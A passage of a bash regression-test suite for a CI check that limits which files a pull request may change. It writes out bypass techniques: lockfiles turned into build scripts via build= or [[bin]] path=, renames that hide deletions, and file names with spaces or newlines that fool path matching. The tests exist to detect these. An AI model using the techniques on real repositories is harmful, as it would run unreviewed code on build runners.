D7="$WORK/non-bot-no-issue"
new_repo "$D7"
mkdir -p "$D7/crates/irontraffic-policy"
printf '[package]\nname="irontraffic-policy"\nversion="0.1.0"\n' > "$D7/crates/irontraffic-policy/Cargo.toml"
commit_all "$D7" base
git -C "$D7" checkout -qb pr
printf '[package]\nname="irontraffic-policy"\nversion="0.1.1"\n' > "$D7/crates/irontraffic-policy/Cargo.toml"
commit_all "$D7" bump
fake_gh 'mallory' 'no closing keyword here'
echo "== a non-bot author with no closing keyword must be refused =="
OUT7="$(run_scope "$D7")" && RC7=0 || RC7=$?
if [ "$RC7" -eq 0 ]; then
  echo "FAIL: case 7 was expected to be refused (non-zero exit) but exited 0. A refusal-shaped" >&2
  echo "message with rc=0 is exactly the branch-protection bypass this suite exists to catch" >&2
  echo "(round six's own finding). Got:" >&2
  echo "$OUT7" | sed 's/^/    /' >&2
  FAILED=1
fi
if echo "$OUT7" | grep -qF 'does not close an issue'; then
  note "a non-bot PR with no Closes line is refused for that reason"
else
  echo "FAIL: a non-bot PR with no closing keyword was not refused for that reason. Got:"
  echo "$OUT7" | sed 's/^/    /'
  FAILED=1
fi

# ---------------------------------------------------------------------------
# 8. An empty diff (BASE_SHA == HEAD_SHA) must never read as EXEMPT. Before
#    this fix, the bot path's loop body simply never ran on an empty
#    changed_now, offending stayed empty, and the script printed EXEMPT with
#    a blank file list and exit 0: a vacuous pass, exactly the shape this
#    workflow's own header legislates against for every other lane.
#
#    The assertion checks for the GUARD'S OWN MESSAGE, not merely the absence
#    of "EXEMPT" (round four's own review battery, M06: deleting the guard
#    entirely). A mutant that removes the guard falls through to
#    `"${changed[@]}"` on a still-empty array a few lines below; on bash below
#    4.4 under `set -u` that is a fatal "unbound variable" abort with no
#    "EXEMPT" text anywhere in its output, so a check that only looks for the
#    ABSENCE of "EXEMPT" cannot tell that apart from this guard firing
#    correctly, and passes either way. Requiring the guard's own text closes
#    that regardless of which of the two ways a deleted guard fails.
# ---------------------------------------------------------------------------
D8="$WORK/empty-diff"
new_repo "$D8"
printf '[workspace]\nmembers=[]\n' > "$D8/Cargo.toml"
commit_all "$D8" base
fake_gh 'dependabot[bot]' ''
echo "== an empty diff must not be reported EXEMPT =="
SHA8="$(git -C "$D8" rev-parse main)"
OUT8="$(run_scope "$D8" "$SHA8" "$SHA8")" && RC8=0 || RC8=$?
if [ "$RC8" -eq 0 ]; then
  echo "FAIL: case 8 was expected to be refused (non-zero exit) but exited 0. A refusal-shaped" >&2
  echo "message with rc=0 is exactly the branch-protection bypass this suite exists to catch" >&2
  echo "(round six's own finding). Got:" >&2
  echo "$OUT8" | sed 's/^/    /' >&2
  FAILED=1
fi
if echo "$OUT8" | grep -qF 'pr-scope-check: EXEMPT'; then
  echo "FAIL: an empty diff was reported EXEMPT. Got:"
  echo "$OUT8" | sed 's/^/    /'
  FAILED=1
elif ! echo "$OUT8" | grep -qF 'FAIL: no files changed between the merge base'; then
  echo "FAIL: an empty diff was not reported EXEMPT, but the guard's own message is missing, so this cannot distinguish the guard firing from some OTHER abort (for example an unbound-variable abort with no 'EXEMPT' text either). Got:"
  echo "$OUT8" | sed 's/^/    /'
  FAILED=1
else
  note "an empty diff is refused rather than vacuously EXEMPT, by the guard's own message"
fi

# ---------------------------------------------------------------------------
# 9. A failed merge base on the BOT path must fail closed, the same as the
#    non-bot path already did. Before this fix the bot path computed
#    `git diff --name-only "$(git merge-base ... || echo "$BASE_SHA")" ...`,
#    silently substituting BASE_SHA on failure instead of refusing.
# ---------------------------------------------------------------------------
D9="$WORK/mergebase-fails-bot"
new_repo "$D9"
mkdir -p "$D9/crates/pol"
printf '[package]\nname="pol"\nversion="0.1.0"\n' > "$D9/crates/pol/Cargo.toml"
commit_all "$D9" base
BASE9="$(git -C "$D9" rev-parse main)"
git -C "$D9" checkout -q --orphan orphan
git -C "$D9" rm -rf --cached . >/dev/null 2>&1 || true
mkdir -p "$D9/crates/pol"
printf '[package]\nname="pol"\nversion="0.2.0"\n' > "$D9/crates/pol/Cargo.toml"
commit_all "$D9" orphan-commit
HEAD9="$(git -C "$D9" rev-parse HEAD)"
fake_gh 'dependabot[bot]' ''
echo "== a bot PR whose merge base cannot be computed must fail closed =="
OUT9="$(run_scope "$D9" "$BASE9" "$HEAD9")" && RC9=0 || RC9=$?
if [ "$RC9" -eq 0 ]; then
  echo "FAIL: case 9 was expected to be refused (non-zero exit) but exited 0. A refusal-shaped" >&2
  echo "message with rc=0 is exactly the branch-protection bypass this suite exists to catch" >&2
  echo "(round six's own finding). Got:" >&2
  echo "$OUT9" | sed 's/^/    /' >&2
  FAILED=1
fi
if echo "$OUT9" | grep -qF 'pr-scope-check: EXEMPT'; then
  echo "FAIL: a failed merge base on the bot path was reported EXEMPT. Got:"
  echo "$OUT9" | sed 's/^/    /'
  FAILED=1
elif ! echo "$OUT9" | grep -qF 'could not compute a merge base'; then
  echo "FAIL: a failed merge base did not produce the expected refusal. Got:"
  echo "$OUT9" | sed 's/^/    /'
  FAILED=1
else
  note "a failed merge base on the bot path fails closed"
fi

# ---------------------------------------------------------------------------
# 10. A changed path containing a literal embedded newline must be refused
#     outright, never matched line by line. This is the guard this fix adds
#     alongside NUL-delimited reading: `grep -q` succeeds if ANY line inside
#     a multi-line value matches, so a value with one allowlisted line and
#     one payload line could otherwise pass.
# ---------------------------------------------------------------------------
D10="$WORK/embedded-newline"
new_repo "$D10"
mkdir -p "$D10/crates/pol"
printf '[package]\nname="pol"\nversion="0.1.0"\n' > "$D10/crates/pol/Cargo.toml"
commit_all "$D10" base
git -C "$D10" checkout -qb pr
newline_path="$D10/crates/pol/Cargo.toml"$'\n'"Cargo.toml"
printf 'payload\n' > "$newline_path"
commit_all "$D10" attack
fake_gh 'dependabot[bot]' ''
echo "== a path with an embedded newline must be refused outright =="
OUT10="$(run_scope "$D10")" && RC10=0 || RC10=$?
if [ "$RC10" -eq 0 ]; then
  echo "FAIL: case 10 was expected to be refused (non-zero exit) but exited 0. A refusal-shaped" >&2
  echo "message with rc=0 is exactly the branch-protection bypass this suite exists to catch" >&2
  echo "(round six's own finding). Got:" >&2
  echo "$OUT10" | sed 's/^/    /' >&2
  FAILED=1
fi
if echo "$OUT10" | grep -qF 'pr-scope-check: EXEMPT'; then
  echo "FAIL: a path with an embedded newline was reported EXEMPT. Got:"
  echo "$OUT10" | sed 's/^/    /'
  FAILED=1
elif ! echo "$OUT10" | grep -qF 'embedded newline'; then
  echo "FAIL: a path with an embedded newline was refused, but not for that reason. Got:"
  echo "$OUT10" | sed 's/^/    /'
  FAILED=1
else
  note "a path with an embedded newline is refused outright"
fi

# ---------------------------------------------------------------------------
# 11. The ordinary non-bot happy path must still work after the declared and
#     changed loops were rewritten from unquoted word-splitting to arrays:
#     an issue that declares a file, a PR that closes that issue and touches
#     exactly that file, must match.
# ---------------------------------------------------------------------------
D11="$WORK/happy-path"
new_repo "$D11"
mkdir -p "$D11/crates/irontraffic-policy/src"
printf 'pub fn x() -> u8 { 1 }\n' > "$D11/crates/irontraffic-policy/src/lib.rs"
commit_all "$D11" base
git -C "$D11" checkout -qb pr
printf 'pub fn x() -> u8 { 2 }\n' > "$D11/crates/irontraffic-policy/src/lib.rs"
commit_all "$D11" implement
fake_gh 'coder-agent' 'Closes #42' '## Files

| Path | Action | Purpose |
| --- | --- | --- |
| `crates/irontraffic-policy/src/lib.rs` | modify | bump the returned value |
'
echo "== the ordinary non-bot happy path still matches after the array rewrite =="
OUT11="$(run_scope "$D11")" && RC11=0 || RC11=$?
if [ "$RC11" -ne 0 ]; then
  echo "FAIL: case 11 was expected to pass (rc=0) but exited non-zero (rc=$RC11)." >&2
  echo "$OUT11" | sed 's/^/    /' >&2
  FAILED=1
fi
if echo "$OUT11" | grep -qF 'pr-scope-check: the diff matches issue #42'; then
  note "a declared, fully-matching non-bot PR still matches"
else
  echo "FAIL: a PR that matches its issue's Files table exactly was not reported as matching. Got:"
  echo "$OUT11" | sed 's/^/    /'
  FAILED=1
fi

# ---------------------------------------------------------------------------
# 12. An undeclared file in a non-bot PR must still be refused after the same
#     rewrite, and named.
# ---------------------------------------------------------------------------
D12="$WORK/undeclared-file"
new_repo "$D12"
mkdir -p "$D12/crates/irontraffic-policy/src"
printf 'pub fn x() -> u8 { 1 }\n' > "$D12/crates/irontraffic-policy/src/lib.rs"
commit_all "$D12" base
git -C "$D12" checkout -qb pr
printf 'pub fn x() -> u8 { 2 }\n' > "$D12/crates/irontraffic-policy/src/lib.rs"
printf 'pub fn extra() {}\n' > "$D12/crates/irontraffic-policy/src/extra.rs"
commit_all "$D12" implement
fake_gh 'coder-agent' 'Closes #42' '## Files

| Path | Action | Purpose |
| --- | --- | --- |
| `crates/irontraffic-policy/src/lib.rs` | modify | bump the returned value |
'
echo "== an undeclared file in a non-bot PR is still refused and named =="
OUT12="$(run_scope "$D12")" && RC12=0 || RC12=$?
if [ "$RC12" -eq 0 ]; then
  echo "FAIL: case 12 was expected to be refused (non-zero exit) but exited 0. A refusal-shaped" >&2
  echo "message with rc=0 is exactly the branch-protection bypass this suite exists to catch" >&2
  echo "(round six's own finding). Got:" >&2
  echo "$OUT12" | sed 's/^/    /' >&2
  FAILED=1
fi
if echo "$OUT12" | grep -qF 'does not declare' && echo "$OUT12" | grep -qF 'extra.rs'; then
  note "the undeclared file is refused and named"
else
  echo "FAIL: an undeclared file did not trip the scope check, or was not named. Got:"
  echo "$OUT12" | sed 's/^/    /'
  FAILED=1
fi

# ---------------------------------------------------------------------------
# 13. Exploit vector 3 (PR 837's third review round): crates/<n>/Cargo.toml
#     declaring `build = "Cargo.lock"` alongside crates/<n>/Cargo.lock
#     carrying the payload, both shapes that used to be on BOT_ALLOWED and
#     both compared literally by the fix above, no glob, no whitespace, no
#     newline, no rename. A per-crate Cargo.lock is never read by Cargo for a
#     workspace member, so its content was completely unconstrained. Must be
#     refused, and the manifest introducing `build` must be named.
# ---------------------------------------------------------------------------
D13="$WORK/vector3-crate-lockfile-payload"
new_repo "$D13"
mkdir -p "$D13/crates/pol/src"
printf '[workspace]\nmembers=["crates/pol"]\n' > "$D13/Cargo.toml"
printf 'pub fn x(){}\n' > "$D13/crates/pol/src/lib.rs"
printf '[package]\nname="pol"\nversion="0.1.0"\nedition="2021"\n' > "$D13/crates/pol/Cargo.toml"
printf '# placeholder\n' > "$D13/crates/pol/Cargo.lock"
commit_all "$D13" base
git -C "$D13" checkout -qb pr
printf '[package]\nname="pol"\nversion="0.1.0"\nedition="2021"\nbuild="Cargo.lock"\n' > "$D13/crates/pol/Cargo.toml"
printf 'fn main(){ /* arbitrary code on the CI runner */ }\n' > "$D13/crates/pol/Cargo.lock"
commit_all "$D13" "chore(deps): bump serde from 1.0.1 to 1.0.2"
fake_gh 'dependabot[bot]' ''
echo "== exploit vector 3: crates/<n>/Cargo.toml declaring build=Cargo.lock, both allowlisted-shaped, must be refused =="
OUT13="$(run_scope "$D13")" && RC13=0 || RC13=$?
if [ "$RC13" -eq 0 ]; then
  echo "FAIL: case 13 was expected to be refused (non-zero exit) but exited 0. A refusal-shaped" >&2
  echo "message with rc=0 is exactly the branch-protection bypass this suite exists to catch" >&2
  echo "(round six's own finding). Got:" >&2
  echo "$OUT13" | sed 's/^/    /' >&2
  FAILED=1
fi
if echo "$OUT13" | grep -qF 'pr-scope-check: EXEMPT'; then
  echo "FAIL: the crate manifest + crate lockfile payload was reported EXEMPT. Got:"
  echo "$OUT13" | sed 's/^/    /'
  FAILED=1
elif ! echo "$OUT13" | grep -qF 'crates/pol/Cargo.toml'; then
  echo "FAIL: the payload was refused, but the offending manifest was not named. Got:"
  echo "$OUT13" | sed 's/^/    /'
  FAILED=1
else
  note "refused, and the offending manifest is named"
fi

# ---------------------------------------------------------------------------
# 14. The [[bin]] path variant of vector 3 must be refused too: a manifest
#     never needs to name a [[bin]] whose path is the lockfile sitting next
#     to it either.
# ---------------------------------------------------------------------------
D14="$WORK/vector3-bin-path-payload"
new_repo "$D14"
mkdir -p "$D14/crates/pol/src"
printf '[workspace]\nmembers=["crates/pol"]\n' > "$D14/Cargo.toml"
printf 'pub fn x(){}\n' > "$D14/crates/pol/src/lib.rs"
printf '[package]\nname="pol"\nversion="0.1.0"\nedition="2021"\n' > "$D14/crates/pol/Cargo.toml"
printf '# placeholder\n' > "$D14/crates/pol/Cargo.lock"
commit_all "$D14" base
git -C "$D14" checkout -qb pr
printf '[package]\nname="pol"\nversion="0.1.0"\nedition="2021"\n\n[[bin]]\nname="tool"\npath="Cargo.lock"\n' > "$D14/crates/pol/Cargo.toml"
printf 'fn main(){ /* arbitrary code */ }\n' > "$D14/crates/pol/Cargo.lock"
commit_all "$D14" "chore(deps): bump"
fake_gh 'dependabot[bot]' ''
echo "== exploit vector 3 variant: [[bin]] path=Cargo.lock must be refused too =="
OUT14="$(run_scope "$D14")" && RC14=0 || RC14=$?
if [ "$RC14" -eq 0 ]; then
  echo "FAIL: case 14 was expected to be refused (non-zero exit) but exited 0. A refusal-shaped" >&2
  echo "message with rc=0 is exactly the branch-protection bypass this suite exists to catch" >&2
  echo "(round six's own finding). Got:" >&2
  echo "$OUT14" | sed 's/^/    /' >&2
  FAILED=1
fi
if echo "$OUT14" | grep -qF 'pr-scope-check: EXEMPT'; then
  echo "FAIL: the [[bin]] path=Cargo.lock payload was reported EXEMPT. Got:"
  echo "$OUT14" | sed 's/^/    /'
  FAILED=1
else
  note "the [[bin]] path variant is refused too"
fi

# ---------------------------------------------------------------------------
# 15. The capability check must fire regardless of WHERE the payload file
#     lives, including at a path that STAYS allowlisted after this fix:
#     crates/<n>/fuzz/Cargo.lock is real and tracked (cargo-fuzz needs it),
#     so dropping crates/<n>/Cargo.lock from BOT_ALLOWED (fix a) does not
#     touch it at all. `build = "Cargo.lock"` inside the fuzz crate's own
#     manifest, resolved relative to that manifest, still points at that
#     still-allowlisted sibling. Only refusing the introduced/changed KEY
#     (fix b), not just the container file, closes this.
# ---------------------------------------------------------------------------
D15="$WORK/vector3b-fuzz-lockfile-stays-allowlisted"
new_repo "$D15"
mkdir -p "$D15/crates/pol/fuzz/fuzz_targets"
printf '[package]\nname="pol-fuzz"\nversion="0.0.0"\npublish=false\nedition="2021"\n\n[workspace]\n\n[dependencies]\nlibfuzzer-sys="0.4"\n\n[[bin]]\nname="t"\npath="fuzz_targets/t.rs"\n' > "$D15/crates/pol/fuzz/Cargo.toml"
printf 'placeholder\n' > "$D15/crates/pol/fuzz/Cargo.lock"
printf '#![no_main]\n' > "$D15/crates/pol/fuzz/fuzz_targets/t.rs"
commit_all "$D15" base
git -C "$D15" checkout -qb pr
printf '[package]\nname="pol-fuzz"\nversion="0.0.0"\npublish=false\nedition="2021"\nbuild="Cargo.lock"\n\n[workspace]\n\n[dependencies]\nlibfuzzer-sys="0.4"\n\n[[bin]]\nname="t"\npath="fuzz_targets/t.rs"\n' > "$D15/crates/pol/fuzz/Cargo.toml"
printf 'fn main(){ /* arbitrary code */ }\n' > "$D15/crates/pol/fuzz/Cargo.lock"
commit_all "$D15" "chore(deps): bump libfuzzer-sys"
fake_gh 'dependabot[bot]' ''
echo "== build= pointed at a lockfile path that STAYS allowlisted (crates/<n>/fuzz/Cargo.lock) must still be refused =="
OUT15="$(run_scope "$D15")" && RC15=0 || RC15=$?
if [ "$RC15" -eq 0 ]; then
  echo "FAIL: case 15 was expected to be refused (non-zero exit) but exited 0. A refusal-shaped" >&2
  echo "message with rc=0 is exactly the branch-protection bypass this suite exists to catch" >&2
  echo "(round six's own finding). Got:" >&2
  echo "$OUT15" | sed 's/^/    /' >&2
  FAILED=1
fi
if echo "$OUT15" | grep -qF 'pr-scope-check: EXEMPT'; then
  echo "FAIL: build= into an allowlisted fuzz lockfile was reported EXEMPT. Got:"
  echo "$OUT15" | sed 's/^/    /'
  FAILED=1
else
  note "refused even though the payload lives at a path fix (a) alone would not touch"
fi

# ---------------------------------------------------------------------------
# 16. No false positive: a real fuzz-crate dependency bump whose [[bin]] path
#     is PRESENT but UNCHANGED between base and head must stay EXEMPT. The
#     capability check compares values, not mere presence.
# ---------------------------------------------------------------------------
D16="$WORK/legit-fuzz-bump-unchanged-bin-path"
new_repo "$D16"
mkdir -p "$D16/crates/pol/fuzz/fuzz_targets"
printf '[package]\nname="pol-fuzz"\nversion="0.0.0"\npublish=false\nedition="2021"\n\n[workspace]\n\n[dependencies]\nlibfuzzer-sys="0.4"\n\n[[bin]]\nname="t"\npath="fuzz_targets/t.rs"\n' > "$D16/crates/pol/fuzz/Cargo.toml"
printf '#![no_main]\n' > "$D16/crates/pol/fuzz/fuzz_targets/t.rs"
commit_all "$D16" base
git -C "$D16" checkout -qb pr
printf '[package]\nname="pol-fuzz"\nversion="0.0.0"\npublish=false\nedition="2021"\n\n[workspace]\n\n[dependencies]\nlibfuzzer-sys="0.5"\n\n[[bin]]\nname="t"\npath="fuzz_targets/t.rs"\n' > "$D16/crates/pol/fuzz/Cargo.toml"
commit_all "$D16" "chore(deps): bump libfuzzer-sys"
fake_gh 'dependabot[bot]' ''
echo "== a legitimate fuzz-crate bump with an UNCHANGED [[bin]] path must stay EXEMPT (no false positive) =="
OUT16="$(run_scope "$D16")" && RC16=0 || RC16=$?
if [ "$RC16" -ne 0 ]; then
  echo "FAIL: case 16 was expected to pass (rc=0) but exited non-zero (rc=$RC16)." >&2
  echo "$OUT16" | sed 's/^/    /' >&2
  FAILED=1
fi
if echo "$OUT16" | grep -qF 'pr-scope-check: EXEMPT'; then
  note "unchanged [[bin]] path across a real bump is not a false positive"
else
  echo "FAIL: a legitimate fuzz-crate bump with an unchanged [[bin]] path was refused. Got:"
  echo "$OUT16" | sed 's/^/    /'
  FAILED=1
fi

# ---------------------------------------------------------------------------
# 17. The reviewer's own combined case (V3C): a rename that hides a source
#     file being deleted, replaced with a payload, at an allowlisted path,
#     alongside a manifest capability change. `--no-renames` must list all
#     three real paths, and the PR must be refused regardless.
# ---------------------------------------------------------------------------
D17="$WORK/vector3c-rename-plus-capability"
new_repo "$D17"
mkdir -p "$D17/crates/pol/src"
{ printf 'pub fn x(){}\n'; for i in $(seq 1 40); do printf '// filler line %s\n' "$i"; done; } > "$D17/crates/pol/src/lib.rs"
printf '[package]\nname="pol"\nversion="0.1.0"\nedition="2021"\n' > "$D17/crates/pol/Cargo.toml"
commit_all "$D17" base
git -C "$D17" checkout -qb pr
git -C "$D17" mv crates/pol/src/lib.rs crates/pol/Cargo.lock
{ printf 'fn main(){ /* arbitrary code */ }\n'; for i in $(seq 1 40); do printf '// filler line %s\n' "$i"; done; } > "$D17/crates/pol/Cargo.lock"
printf '[package]\nname="pol"\nversion="0.1.0"\nedition="2021"\nbuild="Cargo.lock"\n\n[lib]\npath="Cargo.lock"\n' > "$D17/crates/pol/Cargo.toml"
commit_all "$D17" "chore(deps): bump"
NAMEONLY="$(git -C "$D17" diff --name-status main HEAD | tr '\n' '|')"
NORENAME="$(git -C "$D17" diff --no-renames --name-only main HEAD | tr '\n' '|')"
note "with rename detection (name-status): $NAMEONLY"
note "with --no-renames (name-only):       $NORENAME"
if ! { echo "$NORENAME" | grep -qF 'crates/pol/src/lib.rs' \
    && echo "$NORENAME" | grep -qF 'crates/pol/Cargo.lock' \
    && echo "$NORENAME" | grep -qF 'crates/pol/Cargo.toml'; }; then
  echo "FAIL: --no-renames did not list all three real paths on the reviewer's own V3C case. Got:"
  echo "    $NORENAME"
  FAILED=1
else
  note "--no-renames lists all three real paths"
fi
fake_gh 'dependabot[bot]' ''
echo "== the V3C combined case (rename hides deletion + capability change) must be refused =="
OUT17="$(run_scope "$D17")" && RC17=0 || RC17=$?
if [ "$RC17" -eq 0 ]; then
  echo "FAIL: case 17 was expected to be refused (non-zero exit) but exited 0. A refusal-shaped" >&2
  echo "message with rc=0 is exactly the branch-protection bypass this suite exists to catch" >&2
  echo "(round six's own finding). Got:" >&2
  echo "$OUT17" | sed 's/^/    /' >&2
  FAILED=1
fi
if echo "$OUT17" | grep -qF 'pr-scope-check: EXEMPT'; then
  echo "FAIL: the rename-plus-capability payload was reported EXEMPT. Got:"
  echo "$OUT17" | sed 's/^/    /'
  FAILED=1
else
  note "refused"
fi

# ---------------------------------------------------------------------------
# 18. The rename hole on its OWN, non-bot path (SHOULD_FIX, independent of
#     the capability check, which only runs on the bot path): a coder-agent
#     PR renames an UNDECLARED file onto a path the issue DID declare,
#     replacing its content. Without --no-renames, git shows only the
#     declared destination and the deletion of the undeclared file is
#     invisible to a human reading the EXEMPT/MATCHES listing. With
#     --no-renames, the deleted source is its own entry, is not declared,
#     and must be refused and named.
# ---------------------------------------------------------------------------
D18="$WORK/rename-hides-undeclared-deletion-nonbot"
new_repo "$D18"
mkdir -p "$D18/crates/pol/src"
{ printf 'secret sauce\n'; for i in $(seq 1 40); do printf '// filler %s\n' "$i"; done; } > "$D18/crates/pol/src/undeclared_secret.rs"
printf '[package]\nname="pol"\nversion="0.1.0"\n' > "$D18/crates/pol/Cargo.toml"
commit_all "$D18" base
git -C "$D18" checkout -qb pr
git -C "$D18" mv -f crates/pol/src/undeclared_secret.rs crates/pol/Cargo.toml
{ printf '[package]\nname="pol"\nversion="0.2.0"\n'; for i in $(seq 1 40); do printf '// filler %s\n' "$i"; done; } > "$D18/crates/pol/Cargo.toml"
commit_all "$D18" implement
fake_gh 'coder-agent' 'Closes #42' '## Files

| Path | Action | Purpose |
| --- | --- | --- |
| `crates/pol/Cargo.toml` | modify | bump the version |
'
NORENAME18="$(git -C "$D18" diff --no-renames --name-only main HEAD | tr '\n' '|')"
note "with --no-renames: $NORENAME18"
echo "== a rename onto a DECLARED path must not hide the deletion of an undeclared source file =="
OUT18="$(run_scope "$D18")" && RC18=0 || RC18=$?
if [ "$RC18" -eq 0 ]; then
  echo "FAIL: case 18 was expected to be refused (non-zero exit) but exited 0. A refusal-shaped" >&2
  echo "message with rc=0 is exactly the branch-protection bypass this suite exists to catch" >&2
  echo "(round six's own finding). Got:" >&2
  echo "$OUT18" | sed 's/^/    /' >&2
  FAILED=1
fi
if echo "$OUT18" | grep -qF 'pr-scope-check: the diff matches issue'; then
  echo "FAIL: a rename that hid an undeclared source-file deletion was reported as matching. Got:"
  echo "$OUT18" | sed 's/^/    /'
  FAILED=1
elif ! echo "$OUT18" | grep -qF 'undeclared_secret.rs'; then
  echo "FAIL: the rename-hidden deletion was refused, but the deleted file was not named. Got:"
  echo "$OUT18" | sed 's/^/    /'
  FAILED=1
else
  note "the deleted-then-renamed-away file is refused and named"
fi

# ---------------------------------------------------------------------------
# 19. The non-bot UNDECLARED loop must not be foolable by re-word-splitting
#     an already-atomic changed path. Two files are declared, both at repo
#     root so the exploit needs no directory trickery: a.rs and b.rs. The PR
#     does NOT touch either of those; it touches exactly ONE different file,
#     at repo root, whose real single-component name is "a.rs b.rs" (one
#     path, a literal space in the middle, no additional slash on either
#     side). A properly quoted `for f in "${changed[@]}"` compares this one
#     weird path against each declared entry as a whole and never matches,
#     so it is correctly refused and named. `for f in ${changed[*]}` (M11)
#     lets the shell re-split that single element on the space it contains,
#     producing exactly the two declared strings "a.rs" and "b.rs" as
#     separate words, so both "match" and the real, unreviewed file is
#     silently reported as matching the issue instead of being refused: a
#     false PASS, not merely a differently worded failure.
# ---------------------------------------------------------------------------
D19="$WORK/undeclared-loop-unquoted-bypass"
new_repo "$D19"
printf 'a\n' > "$D19/a.rs"
printf 'b\n' > "$D19/b.rs"
commit_all "$D19" base
git -C "$D19" checkout -qb pr
printf 'evil\n' > "$D19/a.rs b.rs"
commit_all "$D19" implement
fake_gh 'coder-agent' 'Closes #42' '## Files

| Path | Action | Purpose |
| --- | --- | --- |
| `a.rs` | modify | first declared file |
| `b.rs` | modify | second declared file |
'
echo "== the undeclared loop must not be fooled by a changed path that word-splits into two declared paths =="
OUT19="$(run_scope "$D19")" && RC19=0 || RC19=$?
if [ "$RC19" -eq 0 ]; then
  echo "FAIL: case 19 was expected to be refused (non-zero exit) but exited 0. A refusal-shaped" >&2
  echo "message with rc=0 is exactly the branch-protection bypass this suite exists to catch" >&2
  echo "(round six's own finding). Got:" >&2
  echo "$OUT19" | sed 's/^/    /' >&2
  FAILED=1
fi
if echo "$OUT19" | grep -qF 'pr-scope-check: the diff matches issue'; then
  echo "FAIL: a single undeclared file whose name splits into two declared paths was reported as matching. Got:"
  echo "$OUT19" | sed 's/^/    /'
  FAILED=1
elif ! echo "$OUT19" | grep -qF 'a.rs b.rs'; then
  echo "FAIL: the weird path was refused, but not named by its real (space-containing) name. Got:"
  echo "$OUT19" | sed 's/^/    /'
  FAILED=1
else
  note "the weird path is refused and named by its real, single, space-containing name"
fi

# ---------------------------------------------------------------------------
# 20. The CARGO_LOCK_EXEMPT loop must not be foolable the same way. The issue
#     declares only crates/pol/Cargo.toml. The PR bumps the root Cargo.lock
#     (which needs cargo_lock_exempt=1 to be forgiven) alongside ONE
#     different file, a sibling of the real manifest, whose real
#     single-component name is "Cargo.toml x" (a literal space, no further
#     slash). As a WHOLE string "crates/pol/Cargo.toml x" is not equal to
#     the declared "crates/pol/Cargo.toml", so a properly quoted `for f in
#     "${changed[@]}"` never sets cargo_lock_exempt, and BOTH the root
#     Cargo.lock and the weird path are correctly refused. `for f in
#     ${changed[*]}` (M12) re-splits that single element into
#     "crates/pol/Cargo.toml" and "x", the first of which IS the declared
#     string and DOES match the `*/Cargo.toml` case pattern, so
#     cargo_lock_exempt is wrongly set to 1 and the root Cargo.lock bump is
#     silently forgiven: it disappears from the failure listing even though
#     the PR is still refused overall (the independent, unrelated weird path
#     is still caught by the untouched undeclared loop), so this
#     specifically checks that "Cargo.lock" is named among the refused
#     paths, not merely that the run exits non-zero.
# ---------------------------------------------------------------------------
D20="$WORK/cargo-lock-exempt-loop-unquoted-bypass"
new_repo "$D20"
mkdir -p "$D20/crates/pol"
printf '[package]\nname="pol"\nversion="0.1.0"\n' > "$D20/crates/pol/Cargo.toml"
printf 'placeholder\n' > "$D20/Cargo.lock"
commit_all "$D20" base
git -C "$D20" checkout -qb pr
printf 'bumped\n' > "$D20/Cargo.lock"
printf 'evil\n' > "$D20/crates/pol/Cargo.toml x"
commit_all "$D20" implement
fake_gh 'coder-agent' 'Closes #42' '## Files

| Path | Action | Purpose |
| --- | --- | --- |
| `crates/pol/Cargo.toml` | modify | the declared manifest |
'
echo "== the cargo_lock_exempt loop must not be fooled into forgiving root Cargo.lock =="
OUT20="$(run_scope "$D20")" && RC20=0 || RC20=$?
if [ "$RC20" -eq 0 ]; then
  echo "FAIL: case 20 was expected to be refused (non-zero exit) but exited 0. A refusal-shaped" >&2
  echo "message with rc=0 is exactly the branch-protection bypass this suite exists to catch" >&2
  echo "(round six's own finding). Got:" >&2
  echo "$OUT20" | sed 's/^/    /' >&2
  FAILED=1
fi
if echo "$OUT20" | grep -qF 'pr-scope-check: the diff matches issue'; then
  echo "FAIL: a bare root Cargo.lock bump alongside an unrelated undeclared file was reported as matching. Got:"
  echo "$OUT20" | sed 's/^/    /'
  FAILED=1
elif ! echo "$OUT20" | grep -qE '^ {4}Cargo\.lock$'; then
  echo "FAIL: root Cargo.lock was not named among the refused (undeclared) paths, meaning cargo_lock_exempt was wrongly set. Got:"
  echo "$OUT20" | sed 's/^/    /'
  FAILED=1
else
  note "root Cargo.lock is correctly named as undeclared, not silently exempted"
fi

# ---------------------------------------------------------------------------
# 21. Fix (a) (dropping crates/<n>/Cargo.lock from BOT_ALLOWED) and fix (b)
#     (the manifest capability check) are independently load-bearing, not
#     redundant: this case is refused ONLY by (a). A crate's Cargo.toml
#     ALREADY has `build = "Cargo.lock"` (imagine it landed in some earlier,
#     human-reviewed commit; it is not this PR's doing). This bot PR touches
#     ONLY the sibling Cargo.lock's content; the manifest is not part of the
#     diff at all. The capability check in manifest_disallowed_diff only
#     runs on files THIS DIFF touches and only flags a key that is
#     INTRODUCED or CHANGED, so it never even looks at this manifest, let
#     alone flags it: the key is present and unchanged. If crates/<n>/Cargo.lock
#     were still on BOT_ALLOWED, this would print EXEMPT while a real build
#     script silently changed underneath an already-declared build=. Refusing
#     it depends entirely on the lockfile no longer matching BOT_ALLOWED.
# ---------------------------------------------------------------------------
D21="$WORK/preexisting-build-key-lockfile-swap"
new_repo "$D21"
mkdir -p "$D21/crates/pol/src"
printf '[workspace]\nmembers=["crates/pol"]\n' > "$D21/Cargo.toml"
printf 'pub fn x(){}\n' > "$D21/crates/pol/src/lib.rs"
printf '[package]\nname="pol"\nversion="0.1.0"\nedition="2021"\nbuild="Cargo.lock"\n' > "$D21/crates/pol/Cargo.toml"
printf '# placeholder, not yet malicious\n' > "$D21/crates/pol/Cargo.lock"
commit_all "$D21" base
git -C "$D21" checkout -qb pr
printf 'fn main(){ /* arbitrary code; build= was already there before this PR */ }\n' > "$D21/crates/pol/Cargo.lock"
commit_all "$D21" "chore(deps): bump serde from 1.0.1 to 1.0.2"
fake_gh 'dependabot[bot]' ''
echo "== a lockfile swap under a PRE-EXISTING, unchanged build= key must still be refused (fix a, independent of fix b) =="
OUT21="$(run_scope "$D21")" && RC21=0 || RC21=$?
if [ "$RC21" -eq 0 ]; then
  echo "FAIL: case 21 was expected to be refused (non-zero exit) but exited 0. A refusal-shaped" >&2
  echo "message with rc=0 is exactly the branch-protection bypass this suite exists to catch" >&2
  echo "(round six's own finding). Got:" >&2
  echo "$OUT21" | sed 's/^/    /' >&2
  FAILED=1
fi
if echo "$OUT21" | grep -qF 'pr-scope-check: EXEMPT'; then
  echo "FAIL: a Cargo.lock content swap under an unchanged, pre-existing build= key was reported EXEMPT. Got:"
  echo "$OUT21" | sed 's/^/    /'
  FAILED=1
else
  note "refused: crates/<n>/Cargo.lock is no longer allowlisted regardless of what the manifest already declared"
fi

# ===========================================================================
